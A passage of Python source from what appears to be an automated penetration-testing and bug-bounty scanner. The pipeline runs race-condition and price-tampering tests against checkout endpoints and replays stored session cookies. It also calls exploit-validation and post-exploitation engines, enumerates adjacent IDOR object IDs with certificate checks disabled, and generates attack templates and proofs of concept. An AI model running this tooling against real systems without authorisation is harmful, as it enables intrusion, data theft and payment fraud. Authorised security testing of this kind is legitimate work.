                    log.info("auth_session go-credential-spray: %d hits across network services", _net_hits)
            else:
                log.debug("auth_session go-credential-spray: binary not found — skipping network spray")
        except Exception as _go_cred_exc:
            log.debug("auth_session go-credential-spray failed (non-fatal): %s", _go_cred_exc)

        (out / "auth_findings.json").write_text(
            json.dumps({"findings": findings}, indent=2)
        )
        return findings

    def _inline_business_logic(self, target: str, out: Path, waf: dict) -> List[dict]:
        # Seed-first: load existing attack_simulation.json if present (prior scan context).
        sim_file = out / "attack_simulation.json"
        if sim_file.exists():
            try:
                raw = json.loads(sim_file.read_text())
                items = []
                if isinstance(raw, list) and raw:
                    items = raw
                elif isinstance(raw, dict):
                    items = raw.get("findings", raw.get("simulations", raw.get("attacks", [])))
                if items:
                    for item in items:
                        if isinstance(item, dict) and not item.get("vuln_type") and item.get("attack_type"):
                            item["vuln_type"] = item["attack_type"]
                    log.info("business_logic inline: loaded %d seeded findings from %s", len(items), sim_file)
                    return items
            except Exception:
                pass

        findings = []
        auth_headers = self._build_auth_headers()
        probe_target = target if target.startswith("http") else f"https://{target}"

        # ── Original simulation engine ─────────────────────────────────────
        try:
            import asyncio as _asyncio
            from oneinfinity.attack_simulation_engine import AttackSimulationEngine
            engine = AttackSimulationEngine()
            sim_results = _asyncio.run(
                engine.simulate_all_paths(target=probe_target, context={})
            )
            for path_result in (sim_results or []):
                if isinstance(path_result, dict):
                    path_result.setdefault("source_type", "simulated")
                    path_result.setdefault("url", target)
                    path_result.setdefault("endpoint", target)
                    path_result.setdefault("vuln_type", path_result.get("attack_type", "business_logic"))
                    path_result.setdefault("severity", "medium")
                    findings.append(path_result)
                elif hasattr(path_result, "to_dict"):
                    fd = path_result.to_dict()
                    fd.setdefault("source_type", "simulated")
                    findings.append(fd)
        except Exception as exc:
            log.warning("business_logic simulation engine: %s", exc)

        # ── Race Condition Testing ─────────────────────────────────────────
        try:
            from oneinfinity.modules.tool_wrappers import run_race_condition_test
            # Test checkout/order endpoints for race conditions
            race_paths = ["/api/checkout", "/api/order", "/checkout",
                          "/api/cart/checkout", "/api/purchase"]
            for path in race_paths:
                race_url = probe_target.rstrip("/") + path
                result = run_race_condition_test(
                    race_url, method="POST", headers=auth_headers,
                    json_body={"quantity": 1}, concurrency=20,
                )
                for f in (result.data or {}).get("findings", []):
                    f.setdefault("source_type", "tool")
                    f.setdefault("vuln_type", "Race Condition")
                    f.setdefault("confidence", 0.75)
                    findings.append(f)
        except Exception as exc:
            log.debug("business_logic race condition tests: %s", exc)

        # ── Payment/Price Tampering ────────────────────────────────────────
        try:
            from oneinfinity.modules.tool_wrappers import run_payment_tampering_test
            result = run_payment_tampering_test(probe_target, headers=auth_headers)
            for f in (result.data or {}).get("findings", []):
                f.setdefault("source_type", "tool")
                f.setdefault("vuln_type", "Payment/Price Tampering")
                f.setdefault("confidence", 0.80)
                findings.append(f)
            if (result.data or {}).get("findings"):
                log.info("business_logic payment tampering: %d findings", len(result.data["findings"]))
        except Exception as exc:
            log.debug("business_logic payment tampering: %s", exc)

        # ── P1.4: LLM Business Logic Analyzer ────────────────────────────────
        # async — bridged via asyncio.run(). Safe without LLM keys (returns structural findings).
        # NOTE: skipped if early-return at line 1192 fired (pre-seeded attack_simulation.json).
        try:
            import asyncio as _asyncio_bl
            from oneinfinity.scan.llm_business_logic_analyzer import LLMBusinessLogicAnalyzer
            _llm_bla = LLMBusinessLogicAnalyzer()
            _llm_result = _asyncio_bl.run(
                _llm_bla.analyze(probe_target, traffic_limit=200, enable_validation=False)
            )
            for _bv in (_llm_result.vulnerabilities or []):
                _fd = _bv.to_dict() if hasattr(_bv, "to_dict") else (_bv if isinstance(_bv, dict) else vars(_bv))
                _fd["source_type"] = "llm_business_logic"
                _fd["vuln_type"] = _fd.pop("category", _fd.get("vuln_type", "Business Logic Flaw"))
                _fd["url"] = _fd.pop("affected_endpoint", _fd.get("url", probe_target))
                _fd.setdefault("endpoint", _fd["url"])
                findings.append(_fd)
            if (_llm_result.vulnerabilities or []):
                log.info("business_logic LLM analyzer: %d findings", len(_llm_result.vulnerabilities))
        except ImportError:
            log.debug("business_logic LLMBusinessLogicAnalyzer not available")
        except Exception as _bla_exc:
            log.debug("business_logic LLMBusinessLogicAnalyzer failed (non-fatal): %s", _bla_exc)

        return findings

    def _inline_exploit_validation(self, target: str, out: Path) -> List[dict]:
        findings = []
        try:
            from oneinfinity.findings.validation_engine_web import WebValidationEngine
            all_f = self._load_findings_from_dir(out)
            engine = WebValidationEngine()
            results = engine.validate_all(all_f)
            updated = engine.apply_results(all_f, results)
            confirmed = [f for f in updated if f.get("validation_status") == "confirmed"]
            (out / "validation_results.json").write_text(
                json.dumps({"validated": len(confirmed), "findings": confirmed}, indent=2)
            )
            findings.extend(confirmed)
        except Exception as exc:
            log.warning("exploit_validation inline failed: %s", exc)

        # ── P1.5: DifferentialScanner — auth vs unauth access-control comparison ──
        # Security council: only useful when auth_headers is non-empty.
        # Endpoint list extracted from loaded findings so comparisons are targeted.
        try:
            _auth_hdrs = self._build_auth_headers()
            if _auth_hdrs:  # mandatory guard — empty = no signal, just wasted requests
                import asyncio as _asyncio_diff
                from oneinfinity.scan.differential_scanner import DifferentialScanner
                probe_target = target if target.startswith("http") else f"https://{target}"
                _all_f_for_diff = self._load_findings_from_dir(out)
                _endpoints = list({
                    f.get("url", f.get("endpoint", ""))
                    for f in _all_f_for_diff
                    if f.get("url", f.get("endpoint", ""))
                })[:30]
                if _endpoints:
                    _diff_scanner = DifferentialScanner(
                        target=probe_target,
                        auth_headers=_auth_hdrs,
                    )
                    _diff_findings = _asyncio_diff.run(
                        _diff_scanner.scan(_endpoints, methods=["GET"])
                    )
                    for _df in (_diff_findings or []):
                        _fd = _df.to_dict() if hasattr(_df, "to_dict") else (_df if isinstance(_df, dict) else vars(_df))
                        _fd.setdefault("source_type", "differential")
                        _fd.setdefault("validation_status", "confirmed")
                        findings.append(_fd)
                    if _diff_findings:
                        log.info("exploit_validation differential: %d access-control findings", len(_diff_findings))
            else:
                log.debug("exploit_validation DifferentialScanner skipped — no auth credentials configured")
        except ImportError:
            log.debug("exploit_validation DifferentialScanner not available")
        except Exception as _diff_exc:
            log.warning("exploit_validation DifferentialScanner failed (non-fatal): %s", _diff_exc)
        # ── Session Replay — re-test confirmed findings with alternate auth states ──
        # Replays each confirmed finding's URL using stored sessions to catch
        # auth-state-dependent vulnerabilities (e.g. same endpoint accessible
        # as different roles, session fixation across auth boundaries).
        try:
            from oneinfinity.auth.session_manager import SessionManager
            from oneinfinity.auth.session_replay import SessionReplay
            from oneinfinity.auth.auth_session_context import AuthSessionContext
            _sm = SessionManager()
            _all_sessions = _sm.list_all()
            _probe_target_sr = target if target.startswith("http") else f"https://{target}"
            _target_sessions = [
                s for s in _all_sessions
                if s.target and (
                    s.target in _probe_target_sr
                    or _probe_target_sr.rstrip("/").endswith(s.target.rstrip("/"))
                )
            ]
            if _target_sessions:
                # Collect confirmed findings that have a replayable URL
                _confirmed_for_replay = [
                    f for f in findings
                    if f.get("validation_status") == "confirmed"
                    and (f.get("url") or f.get("endpoint"))
                ][:20]

                _replay = SessionReplay()
                _sr_results: list = []

                for _sess in _target_sessions[:4]:  # cap to 4 sessions to bound request count
                    _ctx = AuthSessionContext(_sess)
                    # Refresh session via HAR replay if stale
                    if _sess.har_path:
                        _replay.replay(_sess)
                    # Probe each confirmed finding's endpoint with this session's auth
                    try:
                        import urllib.request as _ur_sr
                        import ssl as _ssl_sr
                        _ssl_ctx_sr = _ssl_sr.create_default_context()
                        _ssl_ctx_sr.check_hostname = False
                        _ssl_ctx_sr.verify_mode = _ssl_sr.CERT_NONE
                        for _cf in _confirmed_for_replay:
                            _cf_url = _cf.get("url") or _cf.get("endpoint", "")
                            if not _cf_url:
                                continue
                            try:
                                _sr_req = _ur_sr.Request(
                                    _cf_url, headers={"User-Agent": "Mozilla/5.0"}
                                )
                                # Inject session cookies
                                _cookie_str = "; ".join(
                                    f"{c.get('name','')}={c.get('value','')}"
                                    for c in (_sess.cookies or [])
                                    if c.get("name")
                                )
                                if _cookie_str:
                                    _sr_req.add_header("Cookie", _cookie_str)
                                for _hk, _hv in (_sess.auth_headers or {}).items():
                                    if _hv:
                                        _sr_req.add_header(_hk, _hv)
                                with _ur_sr.urlopen(_sr_req, timeout=6, context=_ssl_ctx_sr) as _sr_resp:
                                    _sr_status = _sr_resp.status
                                    _sr_body = _sr_resp.read(4096).decode("utf-8", errors="replace")
                                # If the endpoint responds 200 with a different session → auth-state vuln
                                if _sr_status == 200:
                                    _sr_finding = {
                                        "vuln_type": "session_replay_access",
                                        "severity": "high",
                                        "url": _cf_url,
                                        "endpoint": _cf_url,
                                        "evidence": (
                                            f"URL {_cf_url} responded HTTP 200 when replayed "
                                            f"with session {_sess.session_id[:8]} "
                                            f"(recorded_at={_sess.recorded_at:.0f}). "
                                            f"Original finding: {_cf.get('vuln_type','')}"
                                        ),
                                        "confidence": 0.75,
                                        "source_type": "session_replay",
                                        "validation_status": "confirmed",
                                        "session_id": _sess.session_id,
                                        "replay_status": _sr_status,
                                    }
                                    _sr_results.append(_sr_finding)
                                    findings.append(_sr_finding)
                                    try:
                                        from oneinfinity.core.db_manager import get_db_manager_sync
                                        get_db_manager_sync().sync_save_finding(_sr_finding)
                                    except Exception:
                                        pass
                            except Exception:
                                pass
                    except Exception as _sr_inner:
                        log.debug("exploit_validation session_replay inner failed: %s", _sr_inner)

                if _sr_results:
                    log.info(
                        "exploit_validation session_replay: %d auth-state findings across %d sessions",
                        len(_sr_results), len(_target_sessions),
                    )
            else:
                log.debug("exploit_validation session_replay: no sessions stored for %s", target)
        except Exception as _sr_exc:
            log.debug("exploit_validation session_replay failed (non-fatal): %s", _sr_exc)

        # ── AutonomousExploitEngine — safe proof-of-exploitability per high/critical ──
        try:
            from oneinfinity.attack.autonomous_exploit_engine import AutonomousExploitEngine
            _aee = AutonomousExploitEngine()
            _high_crit = [
                f for f in findings
                if str(f.get("severity", "")).lower() in ("critical", "high")
            ]
            _aee_results: list = []
            for _hf in _high_crit[:20]:  # cap to avoid runaway re-exploitation
                try:
                    _vr = _aee.validate_finding(_hf)
                    if _vr.get("validated") and _vr.get("status") == "confirmed":
                        _hf["aee_confirmed"] = True
                        _hf["aee_evidence"] = _vr.get("evidence", "")
                        _hf["aee_confidence"] = _vr.get("confidence", 0.92)
                        _aee_results.append(_vr)
                    elif _vr.get("status") == "false_positive":
                        _hf["aee_confirmed"] = False
                        _hf["validation_status"] = "false_positive"
                except Exception as _aee_inner:
                    log.debug("exploit_validation AEE inner failed for %s: %s",
                              _hf.get("finding_id", "?"), _aee_inner)
            if _aee_results:
                log.info("exploit_validation AutonomousExploitEngine: %d confirmed high/critical", len(_aee_results))
        except Exception as _aee_exc:
            log.debug("exploit_validation AutonomousExploitEngine failed (non-fatal): %s", _aee_exc)

        # ── NucleiTemplateGenerator — generate custom template per confirmed finding ──
        _custom_template_dir = str(Path.home() / ".oneinfinity" / "custom_templates")
        _generated_template_paths: list = []
        try:
            from oneinfinity.attack.nuclei_template_generator import NucleiTemplateGenerator as _NTG
            _ntg = _NTG()
            _confirmed_for_templates = [
                f for f in findings
                if f.get("validation_status") == "confirmed"
                and (f.get("url") or f.get("target"))
            ]
            for _cf in _confirmed_for_templates[:50]:
                try:
                    _tpl_path = _ntg.save(_cf, output_dir=_custom_template_dir)
                    _generated_template_paths.append(_tpl_path)
                    _cf.setdefault("nuclei_template", _tpl_path)
                except Exception as _tpl_inner:
                    log.debug("exploit_validation NucleiGen inner failed: %s", _tpl_inner)
            if _generated_template_paths:
                log.info("exploit_validation NucleiGen: %d custom templates saved to %s",
                         len(_generated_template_paths), _custom_template_dir)
                # Persist template paths so vuln_scan phase can reuse them
                try:
                    _tpl_index = out / "custom_nuclei_templates.json"
                    _tpl_index.write_text(
                        json.dumps({"template_dir": _custom_template_dir,
                                    "paths": _generated_template_paths}, indent=2)
                    )
                except Exception:
                    pass
        except Exception as _ntg_exc:
            log.debug("exploit_validation NucleiTemplateGenerator failed (non-fatal): %s", _ntg_exc)

        # ── AutonomousExploitEngine: controlled re-exploitation per high/critical finding ─
        try:
            _unconfirmed_hc = [f for f in self._load_findings_from_dir(out)
                               if f.get("severity") in ("high", "critical")
                               and f.get("validation_status") not in ("confirmed", "exploited", "false_positive")]
            if _unconfirmed_hc:
                from oneinfinity.attack.autonomous_exploit_engine import AutonomousExploitEngine
                _aee = AutonomousExploitEngine()
                _confirmed_by_aee = 0
                for _uf in _unconfirmed_hc[:10]:  # cap: 10 per phase to control timing
                    try:
                        _result = _aee.validate_finding(_uf)
                        if isinstance(_result, dict) and _result.get("status") == "confirmed":
                            _uf["validation_status"] = "confirmed"
                            _uf["confidence"] = min(1.0, float(_uf.get("confidence", 0.5)) + 0.20)
                            _uf.setdefault("source_type", "tool")
                            findings.append(_uf)
                            _confirmed_by_aee += 1
                    except Exception:
                        pass
                if _confirmed_by_aee:
                    log.info("exploit_validation AutonomousExploitEngine: %d findings re-confirmed", _confirmed_by_aee)
        except Exception as _aee_exc:
            log.debug("exploit_validation AutonomousExploitEngine failed (non-fatal): %s", _aee_exc)

        return findings

    def _inline_exploit_chains(self, target: str, out: Path) -> List[dict]:
        findings = []
        try:
            from oneinfinity.attack.exploit_chain_engine import ExploitChainEngine
            from oneinfinity.attack.poc_generator import PoCGenerator
            from oneinfinity.attack.chain_patterns import CHAIN_PATTERNS
            all_f = self._load_findings_from_dir(out)
            engine = ExploitChainEngine()
            chains = engine.detect_chains(all_f, target)
            gen = PoCGenerator()
            for chain in chains:
                pattern = CHAIN_PATTERNS.get(chain.chain_type, {})
                relevant = [f for f in all_f
                            if f.get("vuln_type", "").lower() in pattern.get("trigger_types", set())]
                poc = gen.generate(chain.chain_type, pattern, relevant, target)
                fd = chain.to_dict()
                fd["source_type"] = "simulated"
                fd["vuln_type"] = f"exploit_chain:{chain.chain_type}"
                if poc:
                    poc_path = out / f"poc_{poc.chain_id}.json"
                    poc_path.write_text(json.dumps(poc.to_dict(), indent=2))
                    fd["poc_file"] = str(poc_path)
                findings.append(fd)
            (out / "chains.json").write_text(
                json.dumps({"chains": [c.to_dict() for c in chains]}, indent=2)
            )
        except Exception as exc:
            log.warning("exploit_chains inline failed: %s", exc)

        # ── AttackPathPlanner: BFS-scored ranked attack paths from all findings ──
        # Converts findings into a scored attack graph (BFS), ranks paths by
        # (exploitability × impact × probability), emits each as attack_path finding.
        try:
            from oneinfinity.attack.attack_path_planner import AttackPathPlanner
            _all_f_for_plan = self._load_findings_from_dir(out)
            _planner = AttackPathPlanner()
            _recon_data: dict = {}
            _recon_f = out / "adaptive_recon.json"
            if _recon_f.exists():
                try:
                    _recon_data = json.loads(_recon_f.read_text())
                except Exception:
                    pass
            # plan() = build_graph + find_paths, returns ranked AttackPath list
            _ranked_paths = _planner.plan(_all_f_for_plan, target,
                                          recon_data=_recon_data, max_paths=10)
            # Also detect atomic chains for the findings list
            _app_chains = _planner.detect_chains(_all_f_for_plan)
            # Emit each ranked attack path as an 'attack_path' finding
            for _rank, _ap in enumerate(_ranked_paths):
                _ap_d = _ap.to_dict() if hasattr(_ap, "to_dict") else (
                    _ap if isinstance(_ap, dict) else vars(_ap)
                )
                _ap_finding = {
                    "vuln_type": "attack_path",
                    "severity": "critical" if _ap_d.get("impact_score", 0) >= 0.75 else "high",
                    "url": target,
                    "endpoint": target,
                    "title": f"[Attack Path #{_rank + 1}] {_ap_d.get('chain_description', _ap_d.get('path_id', ''))}",
                    "evidence": (
                        f"path_id={_ap_d.get('path_id','?')} "
                        f"score={_ap_d.get('total_score', 0):.2f} "
                        f"exploitability={_ap_d.get('exploitability_score', 0):.2f} "
                        f"impact={_ap_d.get('impact_score', 0):.2f} "
                        f"difficulty={_ap_d.get('difficulty', '?')} "
                        f"steps={len(_ap_d.get('nodes', []))}"
                    ),
                    "confidence": min(0.95, 0.5 + _ap_d.get("exploitability_score", 0)),
                    "source_type": "attack_path_planner",
                    "validation_status": "confirmed",
                    "attack_path_rank": _rank + 1,
                    "attack_path_score": _ap_d.get("total_score", 0),
                    "attack_path_data": _ap_d,
                }
                findings.append(_ap_finding)
                # Store in PostgreSQL
                try:
                    from oneinfinity.core.db_manager import get_db_manager_sync
                    get_db_manager_sync().sync_save_finding(_ap_finding)
                except Exception:
                    pass
                # Store in Neo4j
                try:
                    from oneinfinity.attack_graph_core import AttackGraphBuilder
                    _agb = AttackGraphBuilder(target)
                    _agb.add_finding(_ap_finding)
                except Exception:
                    pass
            # Append detected chains as findings
            for _chain in _app_chains:
                _cd = _chain.to_dict() if hasattr(_chain, "to_dict") else (
                    _chain if isinstance(_chain, dict) else vars(_chain)
                )
                _cd.setdefault("source_type", "attack_path_planner")
                _cd.setdefault("vuln_type", f"attack_chain:{_cd.get('chain_id', 'unknown')}")
                _cd.setdefault("severity", _cd.get("combined_severity", "high"))
                _cd.setdefault("confidence", 0.75)
                _cd.setdefault("url", target)
                findings.append(_cd)
            if _ranked_paths:
                log.info(
                    "exploit_chains AttackPathPlanner: %d ranked paths, %d chains → %s",
                    len(_ranked_paths), len(_app_chains), target,
                )
            # Save to file for UI/reporting
            try:
                (out / "attack_paths.json").write_text(
                    json.dumps(
                        {"paths": [
                            (_ap.to_dict() if hasattr(_ap, "to_dict") else vars(_ap))
                            for _ap in _ranked_paths
                        ]},
                        indent=2, default=str,
                    )
                )
            except Exception:
                pass
        except Exception as _app_exc:
            log.debug("exploit_chains AttackPathPlanner failed (non-fatal): %s", _app_exc)

        # ── PostExploitEngine: post-exploitation on confirmed high/critical ───
        # Explicitly wires SSRF→cloud enum and IDOR→data enum paths.
        try:
            _all_f_pe = self._load_findings_from_dir(out)
            _hc_findings = [
                f for f in _all_f_pe
                if str(f.get("severity", "")).lower() in ("high", "critical")
                and f.get("validation_status") in ("confirmed", "exploited", None)
            ]
            if _hc_findings:
                from oneinfinity.attack.post_exploit_engine import PostExploitEngine
                _pe = PostExploitEngine(target=target, findings=_hc_findings)
                _pe_results = _pe.run()
                # ── Explicit IDOR → data enumeration path ──────────────────
                # For every IDOR finding, enumerate sequential object IDs to
                # demonstrate data access breadth (safe: read-only GET probes).
                _idor_findings = [
                    f for f in _hc_findings
                    if "idor" in str(f.get("vuln_type", "")).lower()
                ]
                for _if in _idor_findings[:3]:
                    _idor_url = _if.get("url", "") or _if.get("endpoint", "")
                    if not _idor_url:
                        continue
                    try:
                        import urllib.request as _ur_idor
                        import ssl as _ssl_idor
                        import re as _re_idor
                        _ssl_ctx_idor = _ssl_idor.create_default_context()
                        _ssl_ctx_idor.check_hostname = False
                        _ssl_ctx_idor.verify_mode = _ssl_idor.CERT_NONE
                        # Replace numeric path segments to probe adjacent IDs
                        _base_url = _re_idor.sub(r'/(\d+)', '/{id}', _idor_url)
                        _enum_hits = []
                        for _oid in range(1, 6):  # probe IDs 1–5 (non-destructive)
                            _probe = _base_url.replace("{id}", str(_oid))
                            if _probe == _idor_url:
                                continue  # skip known-vulnerable URL
                            try:
                                _req = _ur_idor.Request(_probe,
                                                        headers={"User-Agent": "Mozilla/5.0"})
                                with _ur_idor.urlopen(_req, timeout=5,
                                                      context=_ssl_ctx_idor) as _r:
                                    if _r.status == 200:
                                        _enum_hits.append(_probe)
                            except Exception:
                                pass
                        if _enum_hits:
                            from oneinfinity.attack.post_exploit_engine import PostExploitFinding
                            _pe_results.append(PostExploitFinding(
                                vuln_type="idor_data_enumeration",
                                title=f"IDOR data enum: {len(_enum_hits)} object IDs accessible",
                                severity="critical",
                                url=_idor_url,
                                evidence=(
                                    f"Enumerated {len(_enum_hits)} adjacent object IDs via IDOR.\n"
                                    f"Base URL pattern: {_base_url}\n"
                                    f"Accessible IDs: {_enum_hits}"
                                ),
                                source="idor_data_enum",
                                tool="idor_data_enum",
                            ))
                            log.info(
                                "post_exploit IDOR data enum: %d objects accessible via %s",
                                len(_enum_hits), _base_url,
                            )
                    except Exception as _idor_inner:
                        log.debug("post_exploit IDOR data enum failed for %s: %s",
                                  _idor_url, _idor_inner)

                for _per in (_pe_results or []):
                    _pfd = _per.__dict__ if hasattr(_per, "__dict__") else (
                        _per if isinstance(_per, dict) else {}
                    )
                    if not _pfd:
                        continue
                    _pfd.setdefault("source_type", "post_exploit")
                    _pfd.setdefault("confidence", 0.80)
                    _pfd.setdefault("url", target)
                    _pfd.setdefault("validation_status", "confirmed")
                    findings.append(_pfd)
                    # Store in PostgreSQL
                    try:
                        from oneinfinity.core.db_manager import get_db_manager_sync
                        get_db_manager_sync().sync_save_finding(_pfd)
                    except Exception:
                        pass
                    # Store in Neo4j
                    try:
                        from oneinfinity.attack_graph_core import AttackGraphBuilder
                        _agb_pe = AttackGraphBuilder(target)
                        _agb_pe.add_finding(_pfd)
                    except Exception:
                        pass
                if _pe_results:
                    log.info(
                        "exploit_chains PostExploitEngine: %d findings (SSRF+IDOR+token+privesc)",
                        len(_pe_results),
                    )
                    try:
                        (out / "post_exploit_findings.json").write_text(
                            json.dumps({"findings": [
                                (_p.__dict__ if hasattr(_p, "__dict__") else _p)
                                for _p in _pe_results
                            ]}, indent=2, default=str)
                        )
                    except Exception:
                        pass
        except Exception as _pe_exc:
            log.debug("exploit_chains PostExploitEngine failed (non-fatal): %s", _pe_exc)

        # ── NucleiTemplateGenerator: generate templates for confirmed findings ─
        # generate_batch() saves files and returns list[str] of saved paths.
        # No secondary write needed — just log and index.
        try:
            _all_f_ntg = self._load_findings_from_dir(out)
            _confirmed_ntg = [
                f for f in _all_f_ntg
                if f.get("validation_status") in ("confirmed", "exploited")
                and float(f.get("confidence") or 0) >= 0.75
                and (f.get("url") or f.get("target"))
            ]
            if _confirmed_ntg:
                from oneinfinity.attack.nuclei_template_generator import NucleiTemplateGenerator
                _ntg = NucleiTemplateGenerator()
                _custom_tpl_dir = str(Path.home() / ".oneinfinity" / "custom_templates")
                _saved_paths = _ntg.generate_batch(
                    _confirmed_ntg,
                    min_confidence=0.75,
                    output_dir=_custom_tpl_dir,
                )
                if _saved_paths:
                    log.info(
                        "exploit_chains NucleiTemplateGenerator: %d templates → %s",
                        len(_saved_paths), _custom_tpl_dir,
                    )
                    # Update the index file so vuln_scan phase picks up new templates
                    try:
                        _tpl_index = out / "custom_nuclei_templates.json"
                        _existing: dict = {}
                        if _tpl_index.exists():
                            try:
                                _existing = json.loads(_tpl_index.read_text())
                            except Exception:
                                pass
                        _all_paths = list(dict.fromkeys(
                            _existing.get("paths", []) + _saved_paths
                        ))
                        _tpl_index.write_text(
                            json.dumps({"template_dir": _custom_tpl_dir,
                                        "paths": _all_paths}, indent=2)
                        )
                    except Exception:
                        pass
        except Exception as _ntg_exc:
            log.debug("exploit_chains NucleiTemplateGenerator failed (non-fatal): %s", _ntg_exc)
        return findings

    def _inline_attack_graph(self, target: str, out: Path) -> List[dict]:
        findings: List[dict] = []
        try:
            from oneinfinity.attack_graph_core import AttackGraphBuilder
            builder = AttackGraphBuilder(target)
            builder.from_recon_dir(str(out))
            graph = builder.build()
            stats = graph.stats()
            graph_data = {
                "target": target,
                "output_dir": str(out),
                "nodes": stats.get("total_nodes", stats.get("nodes", 0)),
                "edges": stats.get("total_edges", stats.get("edges", 0)),
                "nodes_by_type": stats.get("nodes_by_type", {}),
            }
            # Wire suggest_chains() — produces ranked attack paths from the graph
            # These feed as simulated findings into exploit_chains and exploit_validation phases
            try:
                chains = builder.suggest_chains(min_exploitability=0.3)
                graph_data["suggested_chains"] = [
                    c if isinstance(c, dict) else (c.__dict__ if hasattr(c, "__dict__") else str(c))
                    for c in (chains or [])
                ]
                for chain in (chains or []):
                    fd = chain if isinstance(chain, dict) else (chain.__dict__ if hasattr(chain, "__dict__") else {})
                    if fd:
                        fd.setdefault("source_type", "simulated")
                        fd.setdefault("vuln_type", fd.get("chain_type", fd.get("name", "attack_chain")))
                        fd.setdefault("severity", fd.get("severity", "high"))
                        fd.setdefault("confidence", fd.get("exploitability", 0.6))
                        fd.setdefault("url", target)
                        findings.append(fd)
                if chains:
                    log.info("attack_graph: %d chain suggestions for %s", len(chains), target)
            except Exception as _sc_exc:
                log.debug("attack_graph suggest_chains failed (non-fatal): %s", _sc_exc)
            (out / "attack_graph.json").write_text(json.dumps(graph_data, indent=2, default=str))
        except Exception as exc:
            log.warning("attack_graph inline failed: %s", exc)
        return findings

    def _inline_ai_theory(self, target: str, out: Path) -> List[dict]:
        findings = []
        try:
            from oneinfinity.zero_day_engine import ZeroDayEngine
            engine = ZeroDayEngine(target=target, output_dir=str(out))
            theories = engine.generate_theories()
            for t in theories:
                fd = t if isinstance(t, dict) else (t.to_dict() if hasattr(t, "to_dict") else {})
                fd["source_type"] = "ai_theory"
                fd.setdefault("validation_status", "unverified")
                fd.setdefault("confidence", 0.40)
                findings.append(fd)
            (out / "zero_day.json").write_text(
                json.dumps({"theories": findings}, indent=2, default=str)
            )
        except Exception as exc:
            log.warning("ai_theory inline failed (non-mandatory): %s", exc)
        return findings

    # ------------------------------------------------------------------ #
    #  Helpers
    # ------------------------------------------------------------------ #

    def _inline_graphql_scan(self, target: str, out: Path) -> List[dict]:
        """Run GraphQL security scan: introspection, fuzzing, mutation testing, IDOR."""
        findings: List[dict] = []
        try:
            from oneinfinity.scan.graphql_scan_engine import GraphQLScanEngine
            probe_url = target if target.startswith("http") else f"https://{target}"
            engine = GraphQLScanEngine(target=probe_url, output_dir=str(out))
            findings = engine.run()
            (out / "graphql_findings.json").write_text(
                json.dumps({"findings": findings, "count": len(findings)}, indent=2, default=str)
            )
            log.info("graphql_scan inline: %d findings for %s", len(findings), target)
        except Exception as exc:
            log.warning("graphql_scan inline failed (non-mandatory): %s", exc)
        return findings

    def _inline_advanced_scan(self, target: str, out: Path, waf: dict = None) -> List[dict]:
        """
        Run UnifiedAdvancedScanner.run_full_scan() — 32 scanners in parallel:
        IDOR, race conditions, CAPTCHA bypass, JWT, NoSQL, SSTI, deserialization,
        LDAP, SAML, prototype pollution, gRPC, SQLi, SSRF, path traversal, CORS,
        XXE, subdomain takeover, HPP, client-side, OAuth leaks, PDF-SSRF, Redis
        injection, rate-limit bypass, cache poisoning, DNS rebinding + attack chain
        detection with PoC generation.

        After scanning, feeds all findings through ExploitChainEngine.detect_chains_from_findings()
        which populates the attack graph and stores detected chains in Neo4j.

        Non-mandatory: import or runtime errors return [] so the pipeline continues.
        Async — bridged via asyncio.run() (executor is synchronous).
        """
        import asyncio as _asyncio_adv
        findings: List[dict] = []
        try:
            from oneinfinity.scan.unified_advanced_scanner import UnifiedAdvancedScanner
            probe_url = target if target.startswith("http") else f"https://{target}"
            scanner = UnifiedAdvancedScanner(target=probe_url)
            scan_result = _asyncio_adv.run(
                scanner.run_full_scan(
                    account_configs=None,     # IDOR requires ≥2 accounts; skip by default
                    source_filter=None,
                    oob_domain=None,          # OOB callbacks require external listener
                )
            )
            raw = scan_result.to_dict()
            # Flatten all per-vuln-class finding lists (31 categories)
            _finding_keys = [
                "idor_findings", "race_findings", "bypass_findings",
                "graphql_findings", "browser_findings", "smuggling_findings",
                "business_logic_findings", "jwt_findings", "nosql_findings",
                "ssti_findings", "deserialization_findings", "ldap_findings",
                "saml_findings", "prototype_pollution_findings", "grpc_findings",
                "sqli_findings", "ssrf_findings", "path_traversal_findings",
                "cors_findings", "xxe_findings", "subdomain_takeover_findings",
                "hpp_findings", "client_side_findings", "oauth_leak_findings",
                "pdf_ssrf_findings", "unicode_norm_findings", "redis_injection_findings",
                "rate_limiting_findings", "cache_poisoning_findings",
                "dns_rebinding_findings", "validated_chains",
            ]
            for key in _finding_keys:
                for item in raw.get(key, []):
                    if not isinstance(item, dict):
                        continue
                    item.setdefault("source_type", "tool")
                    item.setdefault("confidence", 0.75)
                    item.setdefault("validation_status", "unverified")
                    item.setdefault("vuln_class", key.replace("_findings", ""))
                    findings.append(item)
            # Attack chains as synthetic simulated findings
            for chain in raw.get("attack_chains", []):
                if isinstance(chain, dict):
                    chain.setdefault("source_type", "simulated")
                    chain.setdefault("vuln_type", f"exploit_chain:{chain.get('name', 'unknown')}")
                    chain.setdefault("severity", chain.get("severity", "high"))
                    chain.setdefault("confidence", 0.85)
                    findings.append(chain)

            # ── ExploitChainEngine: detect chains + store in Neo4j ─────────────
            # Feeds flat findings list into the attack graph then runs pattern
            # matching across all 15 CHAIN_DEFINITIONS (incl. GraphQL/Redis/MongoDB).
            try:
                from oneinfinity.attack_graph_core.exploit_chain_engine import ExploitChainEngine
                _ece = ExploitChainEngine()
                _chains = _ece.detect_chains_from_findings(findings, target=probe_url)
                if _chains:
                    log.info(
                        "advanced_scan: ExploitChainEngine detected %d chains for %s",
                        len(_chains), target,
                    )
                    # Append chain metadata as simulated findings for downstream phases
                    for _c in _chains:
                        findings.append({
                            "source_type": "simulated",
                            "vuln_type": f"exploit_chain:{_c.name}",
                            "severity": _c.combined_severity,
                            "confidence": min(_c.chain_score / 10.0, 1.0),
                            "title": _c.name,
                            "description": f"Chain detected by ExploitChainEngine: {_c.name}",
                            "estimated_bounty": _c.estimated_bounty,
                            "chain_id": str(_c.chain_id),
                            "vuln_class": "exploit_chain",
                        })
            except Exception as _ece_exc:
                log.debug("advanced_scan ExploitChainEngine failed (non-fatal): %s", _ece_exc)

            # Write structured output file
            (out / "advanced_findings.json").write_text(
                json.dumps({
                    "target": raw.get("target"),
                    "total_findings": raw.get("total_findings", len(findings)),
                    "risk_score": raw.get("risk_score", 0.0),
                    "executive_summary": raw.get("executive_summary", ""),
                    "attack_chains": raw.get("attack_chains", []),
                    "findings": findings,
                    "count": len(findings),
                }, indent=2, default=str)
            )
            log.info("advanced_scan: %d findings, %d chains, risk=%.1f for %s",
                     len(findings), len(raw.get("attack_chains", [])),
